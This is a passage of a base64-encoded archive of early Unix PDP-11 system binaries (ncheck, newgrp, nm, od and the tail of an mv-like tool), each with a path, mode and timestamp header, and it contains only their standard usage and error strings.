cdBACEBUQRxGUGAMCfegUJA7cKdAUXICUABgMOEN8J8AP0AXcAIgM3CmAFNwpgBdevVgUt
AAQCtwpOBbcKTAX3CCgBdxBABTcKQgUXIC4ABAL3CBYBdxA2BYMRw2UEAMEVxAhCFNoDES
D8AkoAARUFBAEL05UtAAEBARX3CQIAUgEAChdyCgBmEAEQAgP3CfD/gBXAZTAAE5CHABOV
AQLDChOVQALDCj4BwR3iBAMKAhPSiwIDgwpEfgIVOAHCFewIAgHCFfAIARUFA/cLwAQCA9
OVMAAACvcJAgAkAWYQCnYCA/cJ9v+AFYBMAgDAZTAAFyA5AAIHwGUHABOQhwDAHYwEwh2G
BPcJlAAMAcAdfgTCHXgE9wmGAAUBBBU3FWgEdwDm/oIRwmUEAIPgJhHmFSAAxBADC8NtTA
QGB/cLSgQDAt8J8APDfsQLBAOOlN8J8AMEf8MLBQfOFSAA3wnwA8N+1guEFXcAoP43Ch4E
AQrAnxQEtwoQBMDlMAAXIPr/AgIAFQMBFyAJAAaCtwr8A1dwCgABYOwBwGUwAIMAxGUIAN
OVPwCHAGYRhRF3HQQABANAEcBlBgA3EPwCAIn0CHcAkgFmEYURAokDAQWGdwCEATcQugMA
CoUVhwBmEYURL4mFFYcAZhGFERiJhRWHAGYRhRF3HQQAwgJ3HQYAvgIAifoIAoZ3AEwBAA
qFFYcAZhGFEUAdBAB3HQYApAJ3HQgAoAIAiQAJAoZ3ACgBhRWHAGYRhRFAHQQAF4kChncA
FAEACoUVhwBmEYURdx0EAHYCdx0GAHICAIkGCQKGdwD0AAAKhRWHAGYRhRF3HQQAXAIAiQ
wJAoZ3ANoAAAqFFYcAZhGFEfcJRAAmEAeJA4bWC3cAwADWCwIDfRAEAIUVhwBmEYURQB0E
AHcdBgAiAncdCAAeAgCJEAkChncAlgCFFYcAZhGFEUAdBAABiWYRQR0CAIURAAp3LPz/+A
ECAsAVAgB3IvIBAwLAZQIAIgF3IugBAwLAZQQAHAF3It4BAwJAbAIAFgF3ItYBBQJBbAIA
wWUEAOYBd6wBAMkBCgImEEASwAAXdPn/AWDBZQIAgBXYAYAMhRWHAEARhREmEeYQphDmC0
gAQRFEGEMYQhhGEYUVhwA3ECgCwBX//0YRhRWHAFVzYWdlOiBtdiBuYW1lMSBuYW1lMgoA
U291cmNlIGZpbGUgbm9uLWV4aXN0ZW50CgBEaXJlY3RvcnkgdGFyZ2V0IGV4aXN0cy4KAD
8/PwoARGlyZWN0b3J5IHJlbmFtZSBvbmx5CgBEaXJlY3RvcnkgcmVuYW1lIG9ubHkKAHZh
bHVlcyBvZiAOQg8gd2lsbCBnaXZlIHJpc2UgdG8gZG9tIQoARmlsZXMgYXJlIGlkZW50aW
NhbC4KACVzOiAlbyBtb2RlIABDYW5ub3QgcmVtb3ZlIHRhcmdldCBmaWxlLgoAVHJ5IGFn
YWluLgoAL2Jpbi9jcABjcABubyBjcAoAPwoAQ2Fubm90IHVubGluayBzb3VyY2UgZmlsZS
4KAKwEZAACBW8A/AR4AD4FZgBMBWUA2gRjAOgEcwC4BGwAWgVyAAAAAAD8//D//f/4/wuJ
AAAAAAmJAAAAAAOJAAAAABKJAAAAAAqJAAAEiQAAAADfCQAA1guWJcZlAAB3ANr2/wE=
-- /bin/ncheck mode=0100775 uid=3 gid=3 atime=174923306 mtime=174923306 base64=1 --
BwE+CDgBfl8AAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JCggBiXcJ+AfOFQEA3wlmBz
cQtGL1JQEABABCAsQVPggDAQ4V3wm8AMwL+wLAHZZidwDaB7cKLiszAfVlAgAGAEAfBgDI
pS0AJwIAnAEAwRV0CDcQEAgRIP4CeQAGALcKBiseAcIVRAhAHQYADhwCAN8J6AQDEAkD0h
D1ZQIABgD1CgQAwiVqCO+C0hX//wgBzhWYCN8JFgVOHwYA3wm8APUKBADKAsIBdwlUBw4K
Zh0EAN8JegfWCzcQrioIBE4dBADmFaII3wkWBdYLWwFOHQQA5hWyCN8JFgXWC/cJ6gbOFQ
AC5hV2CeYVAQDfCWAEliXAHWwIF3QEADcQzGEECgERV3ASADEKgCuECsQlEwP3BvcdsmHC
ZfcJ9AUCCjcKomEECiIBzhUAIOYVegsmEc5lAgDfCWAEliUDCvctimGCYREHtwp8YcAQF3
QFACYQzmV6C4AQwAz4CW4I1guDCsMlAAHrBsRlEAD3LVxhVGHaBoIKwiUDANIG9wmSBfcV
AQBWZXcAhgZ3CXQG/TUAgAQADgNAHwQAwEX/n8AlAEAHAs4VAQDmHRph3wlcA9YLdwBaBn
cJSAbmC/01AIAEADUDQB8EAMBF/5/AJQBALgIECg4RZh0EAN8JxAPWCwIQJQPEZRAAygv0
Aw4KphLfCVwD1gsDEO0DjhDfCdICwAvoAvMdvmACADUK+P/1JQ4A+P/fB8AQQG34/4EQQW
34/3CcAgAEALUK+P/wAXcA3gV3CcwF/TUAgAQAPwNAHwQAwEX/n8AlAEA4AgQKLgHEZRAA
ywsqA/cLDikFAs4Q3wnSAsALIgLCFUQIBAHKIgQDwmUCAMoL+gTCJUQIAobKIhQCzhLmFb
cI3wlEBdYLDgrmHTBg3wkCA9YLzhDOZQIA5hW7CN8JRAXWCw4RZh0EAN8JxAPWCwMQygJ3
AFAFdwk+BUQdBAD0pS4AAgAOAvSLAwAHA/SlLgADAAcC9IsEAAQCwBUBAHcAJAUACvwBdw
kOBfUlAQAEACUDDgpmHQQA3wlcA9YLBBAIAs4VwwgCAc4VxwjfCUQFFQH1JQoABgD3BbUK
BgBOHQYAJh0CAN8JAgPWCw4RzmUEAOYVywjfCUQF1gt3AMYEdwm0BEEdBADADRdyEwNXcB
IARBDEZYArDwFMLQQABQIAEQEBAAp3AJwExGUSAMQl1mICgsQVgCvMC+8C9QsGAPEDtwrK
BPclEwPEBAoGzhXSCN8JFgX3CW4DzhUBAN8JCghMHQQA3AF3CUwEQx0GAEIdBADDNf8BAg
NfAFIEwyUA/gIDXwD2A84d8F7mFfAI3wkWBdYLAAozAco1ABAMAsMlABD4B8AQF3T3/8AM
gGAEHAgA8AMXAcMLDALyCwgA6gPOFQAC5hXkYqYcCADfCWAEliXAEBd09//ARYD/wAwEHO
Ri2APOFQAC5hXkZCYR3wlgBJYlwBDARQD+wGXkZHcAwgN3CbADzhUDAGYdBADmHQ4n3wm6
B5YlTh0IAGYdBgDmHfwm3wmYB5YlQC0IAAkDTh0EAOYVCAnfCRYF1gv3CWoDdwB+A3cJbA
POFQMAZh0EAOYdyibfCboHliXOFQACZh0GAOYduCbfCegHliXAJQACCQNOHQQA5hUXCd8J
FgXWC/cJJgN3ADoDdwkoA0IdBAAECgoBwyU5AAsFARFXcAoARBDEYMRl0P+DlMMlMADyBw
ARdwAMA3cJ+gL3CQYC9xUCAMphTh0IAGYdBgBmHQQA3wlEBZYl9x2iXbJh9wnkAXcA3gJ3
CcwCxuV+AHcdBACUYUQRxGUGAMCfimEJA7cKhGEXICUABgMOEN8J9gb0AXcArgI3CnBhNw
pwYdevZmEtAAQCtwpeYbcKXGH3CCgBdxBQYTcKUmEXIC4ABAL3CBYBdxBGYYMRw2UEAMEV
KAlCFNoDESD8AkoAARUFBAEL05UtAAEBARX3CQIAUgEAChdyCgBmEAEQAgP3CfD/gBXAZT
AAE5CHABOVAQLDChOVQALDCj4BwR3yYAMKAhPSiwIDgwpEfgIVOAHCFVAJAgHCFVQJARUF
A/cL0GACA9OVMAAACvcJAgAkAWYQCnYCA/cJ9v+AFYBMAgDAZTAAFyA5AAIHwGUHABOQhw
DAHZxgwh2WYPcJlAAMAcAdjmDCHYhg9wmGAAUBBBU3FXhgdwDm/oIRwmUEAIPgJhHmFSAA
xBADC8NtXGAGB/cLWmADAt8J9gbDfsQLBAOOlN8J9gYEf8MLBQfOFSAA3wn2BsN+1guEFX
cAoP43Ci5gAQrAnyRgtwogYMDlMAAXIPr/AgIAFQMBFyAJAAaCtwoMYFdwCgABYOwBwGUw
AIMAxGUIANOVPwCHAGYRhRHAHfRfBAL3CSwAwB3qX1CdBAAHA7cK4F/3CtpfAgb3CRQAQB
0EAIUVhwBmEYUR9wkEAIUVhwDAHb5fCgPA5fRmNxAeAsAdrF8BAoAKAIlYCfcV9GaiX/cV
AAKaX9ctlF8CAAOC9xUBAIxfhwBmEYURQB0EACmJAoZ3ALoAhRWHAGYRhRF3HQQA3AF3HQ
YA2AEAiV4JAoZ3AJwAhRWHAGYRhRFAHQQAdx0GAMABdx0IALwBAIlkCQKGdwB6AIUVhwBm
EYURQB0EAHcdBgCkAXcdCACgAQCJagkChncAWAAACoUVhwBmEYURJImFFYcAZhGFEUAdBA
B3HQYAfAF3HQgAeAEAiXAJAoZ3ACoAhRWHAGYRhRFAHQQAAYlAEYURJhHmEKYQ5gtIAEER
RBhDGEIYRhGFFYcANxCsWsAV//9GEYUVhwCECI4IAAD//wAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAACgCcAcgBRAJhAGkAcwAAAHIAeABIAKQAL2Rldi9ycmsy
AC9kZXYvcnJwMABCYWQgZmxhZwoAY2Fubm90IG9wZW4gJXMKACVzOgoAJWQJAC8lLjE0cw
oAPz8/AC4uLgAvJS4xNHMAT3V0IG9mIGNvcmUtLSBpbmNyZWFzZSBORElSUwoATW9uc3Ry
b3VzIGRpcmVjdG9yeSAlbAoAcmVhZCBlcnJvciAlZAoAd3JpdGUgZXJyb3IgJWQKAAC6BW
QAEAZvAAoGeABMBmYAWgZlAOgFYwD2BXMAxgVsAGgGcgAAAAAA/P/w//3/+P8EifRmAAAF
iQAAAAADiQAAAAATiQAAAAAEiQAAAAA=
-- /bin/newgrp mode=0104755 uid=0 gid=3 atime=174923320 mtime=174923320 base64=1 --
BwFMCLIDxg4AAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JDAcBiXcJ+gb1JQIABAAGB8
4VTAjfCXAD9wmQAs4V/gvmFWUI3wmuBdYLwAsGBM4VcAjfCXAD9wlyAs4V/gvmFRAQ3wlK
AtYLwxUQEEAdBgACHAIABQHTixYDwyUYEBOD0qL5A84V/gvfCRgCwAvlAkAdBgAOHAIA5h
WICN8JcAPWC/cJJgLOFQQO5hWkCN8JrgXWC8ALBgTOFbAI3wlwA/cJCALDFSQQ9wmWBQQQ
xEUA/84VBA7mEN8JSgLWC84VBA7mFRAQ3wlKAtYLzhUEDt8JigIAIQcC94sgDwICtwoYE9
OL/gLOFQQO3wkYAsAL4AILis4V/gvmFRoQ3wlKAtYLzhX+C98JigIEEMQlAQBOAjcK5BL3
C+ASYAP3i+YOXQPOFcsI3wlwA84VBA4mCt8JYAbWC/cdugy6DPdFCACyDM4VBA4mCt8JzA
bWC84VAALmFf4LJgrfCX4GliX3HZQMkAzOFQQOJgrfCcwG1gvOFdYI3wlwA8MVEBDCFf4L
wyUYEB6DyqUKABsDk5T4AcIVEBACAdOLvgPSovwD04v+AsuL9QL3JSwATBIjAsMVJBDOFf
4L5hUQEN8JSgLWC/ABC4rOFRAQ3wlABwMQwhUaEJOkDwLCJSIQ+4IOEd8JoAbACwUEzhXY
CN8J5gICAfcJuADOFd8I3wlwA/cJrAB3AAwFdwn6BBEB9yUKAOgRBwL3FQEA4BHAFQEAdw
DwBE4dBADfCRIGNxDMEfcLyBHsBgAK8wF3CcgEQx0EAMIQwmUIAAsBxCUsABADxCU6AA0D
xAsLB4MgAYMTkU4dBgDfCRIGBBDEJQoA7QILijcRhhF3AJoEdwmIBAQKCgHDJTkADwUBEV
dwCgBEEMRgxGXQ/04dBADfCRIGAxDDJTAA7gf3EFIRABF3AGQEdwlSBPcJjgMOEN8JtgYO
CuYV7gjmFeYI3wmSBZYl9wkqBHcAPgR3CSwExBXwCPctsAYcEQUHwB0WEcAMBBxgCU4dBA
DfCVgDAxARA84QZh0EAOYVAgDfCeoGliXOFQIA5hX+COYVAgDfCeoGliUOEd8JWAMOECYR
5hUCAN8J6gaWJc4VAQDmFQEJ5hUCAN8J6gaWJXcAzAN3CboDRB0EANSL/gIAEUDtBADACn
cAtAN3CaIDxuV+AHcdBACYEEQRxGUGAMCfjhAJA7cKiBAXICUABgMOEN8JIgX0AXcAhAM3
CnQQNwp0ENevahAtAAQCtwpiELcKYBD3CCgBdxBUEDcKVhAXIC4ABAL3CBYBdxBKEIMRw2
UEAMEVBAlCFNoDESD8AkoAARUFBAEL05UtAAEBARX3CQIAUgEAChdyCgBmEAEQAgP3CfD/
gBXAZTAAE5CHABOVAQLDChOVQALDCj4BwR32DwMKAhPSiwIDgwpEfgIVOAHCFSwJAgHCFT
AJARUFA/cL1A8CA9OVMAAACvcJAgAkAWYQCnYCA/cJ9v+AFYBMAgDAZTAAFyA5AAIHwGUH
ABOQhwDAHaAPwh2aD/cJlAAMAcAdkg/CHYwP9wmGAAUBBBU3FXwPdwDm/oIRwmUEAIPgJh
HmFSAAxBADC8NtYA8GB/cLXg8DAt8JIgXDfsQLBAOOlN8JIgUEf8MLBQfOFSAA3wkiBcN+
1guEFXcAoP43CjIPAQrAnygPtwokD8DlMAAXIPr/AgIAFQMBFyAJAAaCtwoQD1dwCgABYO
wBwGUwAIMAxGUIANOVPwCHAGYRhRHAHfgOBAL3CSwAwB3uDlCdBAAHA7cK5A73Ct4OAgb3
CRQAQB0EAIUVhwBmEYUR9wkEAIUVhwDAHcIOCgPA5SQUNxDOA8AdsA4BAoAKAIk0CfcVJB
SmDvcVAAKeDtctmA4CAAOC9xUBAJAOhwBmEYURdx0EAKADQBHAZQYANxCYAwCJOgl3AIQB
ZhGFEXcdBACKAwCJQAlKh0EdBgAREBEKAAqFFYcANwpADmYRhRFBHQQA8eUCAAIADwRXLA
IA//8HBWaeBAD3CUIAQBwEAAcB9wk4APEKAgBAHAQAJpQ2lAEAMRAEAIAVhRWHAGYRhRFB
HQQA8QoCAAIE9wkOAAAKQN4EALEKBACFFYcAQBDAZQYANxAMAzEQBABAEgCJRgkFh8AKA4
ExEAIAhwB3ANwAZhGFERiJhRWHAGYRhRFAHQQAdx0GAOACAIlMCQKGdwC6AAAKhRWHAGYR
hRFAHQQAdx0GAMYCdx0IAMICAIlQCQKGdwCWAIUVhwBmEYURQB0EAC6JAoZ3AIIAAAqFFY
cAZhGFEUAdBAAXiQKGdwBsAAAKhRWHAGYRhRFAHQQAdx0GAH4CAIlWCQKGdwBOAAAKhRWH
AGYRhRFAHQQAdx0GAGQCdx0IAGACAIlaCQKGdwAqAIUVhwBmEYURQB0EAAGJQBGFESYR5h
CmEOYLSABBEUQYQxhCGEYRhRWHADcQ2gzAFf//RhGFFYcAZhGFEXcRygxAHQQA9wkIADcK
vgyFFYcAZhCmEOYQJhFmEQEQwBUkGNCVBADQlRwAFyBkGAKGUJT7AsAKwRUkGAKc//9DlM
J4kJAXIKQY+IfEFSQXxRUkFuYVAAECCgwKwxX0CwAKgRMTckJgwkUgAIxc0AvXIPoLAoaN
XNQL1yD+C/CHzuUCANQL1QsXISQY5YfWC8AVJBjCFcQYwxXEGQGUwUWA/8EMUhwkFlMcJB
cXIKQY9YfEFaQYwxVEGsIYwBXEGAUKkDABA4WKFyDEGfqHJhEEChdzPgDFZTAAVyE5AAeD
xWUHAFchWgACg8VlBgCEFVSRFyGsGOGHhRWEFYMVghWBFcAVpBiHAHVzYWdlOiBuZXdncn
AgZ3JvdXBuYW1lCgAvZXRjL2dyb3VwAGNhbm5vdCBvcGVuIGdyb3VwIGZpbGUKACVzOiBu
b3QgYSB2YWxpZCBncm91cCBuYW1lCgAvZXRjL3Bhc3N3ZABjYW5ub3Qgb3BlbiBwYXNzd2
9yZCBmaWxlCgBwYXNzd29yZDogAAoAc2V0Z2lkAFNvcnJ5CgAvYmluL3NoAC0AVW5rbm93
biBlcnJvcgA6IAAKAADmA2QAPARvADYEeAB4BGYAhgRlABQEYwAiBHMA8gNsAJQEcgAAAA
AA/P/w//3/+P8EiSQUAAALiQAAAAAFiQAAAAADiQAAAAIgiQAAA4kAAAAAH4kAAASJAAAA
AKQJrAm7CdUJ5Qn9CQcKIQozCkUKVQphCnMKgwqVCp4KtArGCtIK5ArzCgMLEgsjCzcLSw
tcC2sLeguSC58LtQvECyEARXJyb3IgMABOb3Qgc3VwZXItdXNlcgBObyBzdWNoIGZpbGUg
b3IgZGlyZWN0b3J5AE5vIHN1Y2ggcHJvY2VzcwBJbnRlcnJ1cHRlZCBzeXN0ZW0gY2FsbA
BJL08gZXJyb3IATm8gc3VjaCBkZXZpY2Ugb3IgYWRkcmVzcwBBcmcgbGlzdCB0b28gbG9u
ZwBFeGVjIGZvcm1hdCBlcnJvcgBCYWQgZmlsZSBudW1iZXIATm8gY2hpbGRyZW4ATm8gbW
9yZSBwcm9jZXNzZXMATm90IGVub3VnaCBjb3JlAFBlcm1pc3Npb24gZGVuaWVkAEVycm9y
IDE0AEJsb2NrIGRldmljZSByZXF1aXJlZABNb3VudCBkZXZpY2UgYnVzeQBGaWxlIGV4aX
N0cwBDcm9zcy1kZXZpY2UgbGluawBObyBzdWNoIGRldmljZQBOb3QgYSBkaXJlY3RvcnkA
SXMgYSBkaXJlY3RvcnkASW52YWxpZCBhcmd1bWVudABGaWxlIHRhYmxlIG92ZXJmbG93AF
RvbyBtYW55IG9wZW4gZmlsZXMATm90IGEgdHlwZXdyaXRlcgBUZXh0IGZpbGUgYnVzeQBG
aWxlIHRvbyBsYXJnZQBObyBzcGFjZSBsZWZ0IG9uIGRldmljZQBJbGxlZ2FsIHNlZWsAUm
VhZC1vbmx5IGZpbGUgc3lzdGVtAFRvbyBtYW55IGxpbmtzAEJyb2tlbiBQaXBlAAEAAgAE
AAgAEAAgAEAAgAAAAQACAAQACAAQACAAQACAAQACACAAEgAKAAYABAA=
-- /bin/nm mode=0100775 uid=3 gid=3 atime=174923344 mtime=174923344 base64=1 --
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
JbVg+P9EHfj/FgHmEGYd9v//CbwCliU1EPL/4APACwoHRC34/+QDzhAmEd8JlgfWC4Pgzw
GD4EMt9v/nh0Qt+P8lAkAd+P9A7QQAQR0GAEHt9v9AIA0GTh0GAGYd9v+OYN8JQAbWC3Ud
+P8GAF8ATAZOHfj/Zh0EAN8JQAbWC0Ad9v+AYDUQBABfAEwGDhG14Pj/Zh34/+YQ3wm6B5
YlteD2/0Md9v+WAXcA+gB3CegA5gv1HRwC+P9EHQQAQx0GAAKT1JKTkPUK+P/6AncA1gB3
CcQAxuUEAPUd9gH2/0QdBABDHQYAQh0IADWT+P+UktKSU534//UK9v/3AncApgBmEYURQB
0EAHcdBgCUAXcdCACQAQCJigkChncAlgCFFYcAZhGFEfcdgAF8AXdtBAB2AQCJkAkChncA
eADAHWoBd20EAGQBhRWHAGYRhRF3HQQAVAEAiZAJAoZ3AFYAdx0EAEYBAAqFFYcAZhGFEU
AdBAB3HQYANgF3HQgAMgEAiZYJAoZ3ACwAAAqFFYcAZhGFEUAdBAABiUARhREmEeYQphDm
C0gAQRFEGEMYQhhGEYUVhwA3EBwBwBX//0YRhRWHAIAdAgCBHQQANnIGAHcQFgOHAIAdAg
CBHQQANnIGAEAQhwABAFYAdAB0AHQAXAB0AHQAdAB0AHQAdABQAHQAcAB0AGgAdAB0AGIA
YS5vdXQAY2Fubm90IG9wZW4gaW5wdXQKAGJhZCBmb3JtYXQKAG5vIG5hbWUgbGlzdAoAIC
AgICAgACVjIABVQVREQkMAdWF0ZGJjACUuOHMKACVjACVjACAEZAB2BG8AcAR4ALIEZgDA
BGUATgRjAFwEcwAsBGwAzgRyAAAAAAD8//D//f/4/wSJ0gkAAAWJAAAAAAOJAAAAABGJAA
DUCxOJAAAAAA==
-- /bin/od mode=0110775 uid=3 gid=3 atime=174929264 mtime=174923377 base64=1 --
BwGcDdADTgQAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JRg0BiXcJNA3G5Q4AzhUBAN
8Jzgw3EIYT9WUCAAYA9SUBAAQARgR1HwYA7P/9pS0A7P8/AkCf7P+1Cuz/NRDy/zMDwOVh
ABcgDgAJgsAMeACiDfdVAQAiE/UVBgD4//UtGhP4/+cEdx34/xAT4wH3VQIABhP1FQUA+P
/xAfdVBAD4EvUVBAD4/+oB91UIAOoS+AH3VRAA4hLtAfdVIADaEvUVBwD4/9sB9QoEAPVl
AgAGAPcLxBIGAvcVBgC+EvcVAQC2EvUlAQAEABwEQB8GAMilKwAXAw4KZh8GAN8J4gzWCz
cQkhIJBE4fBgDmFboP3wmsCtYLXwD2AfVlAgAGAPUKBAD1JQEABAAEBE4fBgDfCVQF9RUB
APj/9R1mEu7/9R1iEvD/NQry/yEB9wmCAjUQ9P/3C0oSHgJAHfL/wAxwHfT/bBH1C/L/DA
N1Lfb/9P8CAwAKAgHAFQEAQAo1QPj/AwF1HfT/9v+1CvL/9S0aDPL/2wb1C/L/KAP1C/j/
GQP3C/wRFgL3CwISBAP1LfoR9v8LA/cJUAB3Hfb/7BF3He7/4hF3HfD/3hF3bfL/3BEMAf
cJMgBOHfL/5hVsEWYRzmXu/98JWgKWJfcLshGhA84VmBPfCSICzhUKAN8JXgz3CZIKdwBg
C3cJTgv3C5wRCwM3CpYRzhUBAOYVoBPmFZwT3wlaApYldwA8C3cJKgvOFQQA5h1uC2YfBA
DfCc4EliXOFQMA5h1cC0AdBAAmHAIA3wnOBJYlzhUgAN8JXgx3AAQLdwnyCsblBgD1FQEA
9v/1FQEA9P/1PRwR9P83A/UL9v8dA04dBADfCSICNQr2/zUK+P8nAU4d9P9AHfj/wAxAbQ
YAJhLfCfQC1gtAHQgAwApALfj/EALOFQoADwE1Cvj/9SUIAPj/4wfOFSAA3wleDLUK+P/1
Ac4VIADfCV4MtQr4/3UtCAD4/9UGdW30//T/9Qv0/78CdwBqCncJWApAHQYAwRXADTcQyA
oRIP4CeQAMAM4VBgDfCS4FzhUGAOYVCABmHQQA3wnOBJYldwA0Cs4VBQDfCS4FzhUFAOYV
CgDwAc4VBADfCS4FTh0EAN8J6gbsAc4VBADfCS4FzhUEAOYVEADeAc4VBQDfCS4FTh0EAN
8JXgTOFSAA3wleDEAdBAAXdPj/DhDfCV4EzwHOFQcA3wkuBc4VAwDmFQgAZh0EAM5FAP/f
Cc4EliXOFSAA3wleDM4VAwDmFQgAQB0EABd0+P8mEM5FAP+tAXcJhgnG5QQA9wk2ADUQ+P
/AJf//BgL3FQEAtA8ACncAdgn3CRwANRD2/8Al//8CAjUK9v9AHfb/F3QIAEBd+P/uAXcJ
RAn3LYQPgA8SBs4VAALmFYwR5h1sD98JAA2WJTcQag8EBsAV//93ACoJNwpaD7cKXg/3LV
4JWA8EBrcKUA83Ck4PwB1CDwCcjBHARQD/two2D+kBdwnuCPVFAP8EAPUlHwAEABIE9SV/
AAQADgf1JVwABAAKA84VIADfCV4MTh0EAN8JXgx3AMoIzhVcAN8JXgxAHQQAwRXcDTcQPA
kRIP4CeQAIAM4VMADrAc4VbgDoAc4VXADlAc4VdADiAc4VPwDfAXcJfgj1CwgAKQNOHQgA
zgpmHQYAZh0GAGYdBAAmCvcJigjGZQYAJhDfCc4EliVOHQYAZh0EACYK3wmMDZYlNRAEAM
AlCQAEBA4QzmVXAAQBTh0EAM5lMADfCV4MdwAwCHcJHgjmC3UdBAD4/wYBzhUgAN8JXgy1
Cvj/9S1EDvj/9gZ3AAoIdwn4B8blDgB1HQQA+P9AHfj/tQr4/8iL+gJAHfj/QO0EAMAKNR
Dw/zUK7P/ACwwHQB34//ClYgD+/wYC9Qrw/7UK7P/1Cvj/9Qvw/w4HQB34//ClLgD+/wgC
9Qrw//cVCgDkB/cV6APgBzUK9P81Cu7/GAFAHQQAQG3u/wCSNRDy/8AlMAAMBsAlOQAJBU
Ed9P93cLIHAWDBZdD/dRD0/7UK7v9AHfD/QO3u/8AlAwDhBTUK9v8YAUAdBABAbe7/AJI1
EPL/wCUwAAwGwCU5AAkFQR32/3dwbgcBYMFl0P91EPb/tQru/0Ad8P9A7e7/4wb1C+z/Hw
NBHfT/d3BKB0Ft9v91EPD/NQr0/zUK9v9AHfD/9Qrw/8ALDQP1ZQAC9v/1LSQH9v/zBvXt
HAf2/7UK9P/2ATUK8P8PAfdlAAIEDQUB9+0CB/wMtwr2DPct+AbyDPcHtQrw/8Ad5gyACk
At9P/rBs4VAwBmHfD/5h3GDN8JIg2WJfUtyAz0/wQC9S3CDPb/BQP3CSj9wCX///MCdwB0
BncJYgbG5QYATh0EAN8JOAc1EPj/NQr2/wYBTh30/98JXgy1Cvb/QJ/4/7UK+P81EPT/Bw
PyAc4VIADfCV4MtQr2//UlBAD2//YGdwAmBncJFAZAHQQAwEX/DwEQAAoXcgUAwQzBZVoP
GRBBFCEg/gJ5ACoAQB0EAMBF/wHBFfANNxCGBhEg/gJ5AAQAwBXKD3cA4AXAFc4P+wFAHQ
QAwEX/AMEV/A03EHYGESD+AnkADgDAFdIP7AHAFdUP6QHAFdkP5gHAFd0P4wHAFeEP4AHA
FeUP3QHAFekP2gFAHQQAwEU/AAEQAAoXcgUAwQzBZRwOGRBBFCEg/gJ5AC4AwBXtD8YBwB
